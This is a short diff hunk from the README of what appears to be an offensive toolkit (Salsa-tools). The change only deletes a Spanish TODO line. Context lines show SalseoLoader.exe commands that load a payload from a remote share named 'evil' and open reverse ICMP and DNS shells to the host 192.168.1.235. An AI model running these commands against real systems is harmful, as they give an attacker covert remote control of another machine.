@@ -88,5 +88,5 @@ SalseoLoader.exe hc0n-2019 \\192.168.1.235\evil\elmal.txt reverseicmp 192.168.1.
 SalseoLoader.exe hc0n-2019 C:\elmal.txt reversedns 192.168.1.235 licordebellota.org
 ```
 ![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example4.png)
-TODO faltan ejemplos de como se hace con la DLL
+
 
